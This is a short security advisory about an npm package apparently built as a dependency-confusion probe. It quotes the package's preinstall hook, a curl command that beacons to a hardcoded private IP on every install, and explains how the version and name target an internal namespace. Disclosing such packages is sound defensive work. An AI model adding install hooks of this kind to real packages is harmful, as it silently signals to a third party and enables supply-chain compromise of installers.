summary: Dependency-confusion probe beacons to hardcoded private IP on install
details: The package's preinstall lifecycle hook in package.json unconditionally executes `curl http://10.107.121.85:8000/callback_ect654321` during `npm install`. This auto-fires on every installer without consent and beacons install-success plus a package-specific path identifier to a hardcoded RFC1918 address over cleartext HTTP. The package has no documented purpose, no meaningful main, and a name/version pair (`ect-654321`@`100.0.0`) consistent with a dependency-confusion probe targeting an internal package namespace. Any installer that resolves this name from the public registry (instead of an intended internal mirror) silently signals reachability to the operator of 10.107.121.85, confirming a supply-chain misconfiguration that can be escalated.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
